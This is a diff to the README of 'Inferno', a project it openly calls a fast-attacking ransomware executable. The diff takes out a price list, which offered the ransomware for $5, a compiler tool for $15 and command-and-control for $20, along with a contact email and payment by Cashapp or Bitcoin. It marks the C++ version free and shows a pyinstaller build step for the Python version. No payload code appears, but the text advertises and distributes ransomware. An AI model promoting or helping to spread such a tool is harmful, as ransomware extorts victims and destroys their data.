@@ -4,7 +4,7 @@ Inferno Is An Ransomware Executable That Is Relentess And Attack At Fast Speeds
 
 # Python Version.
 
-Please note that the python version is only free and does basically the same but slower and less secure.
+Please note that the C++ version is only free and does basically the same but slower and less secure.
 So please use at your own risk.
 Needed to install/compile
 ```
@@ -12,16 +12,7 @@ pyinstaller --onefile Inferno.py
 ```
 
 # CPP Version.
-
-Please email me here: PynxTheGoat@gmail.com
-I Only Take Cashapp Or An Btc Payment
-For payments/collabs.
-
-Price: $5 
-
-Compiler Tool $15
-
-Command And Control: $20
+FREE
 
 # How Does The Python Version Work?
 
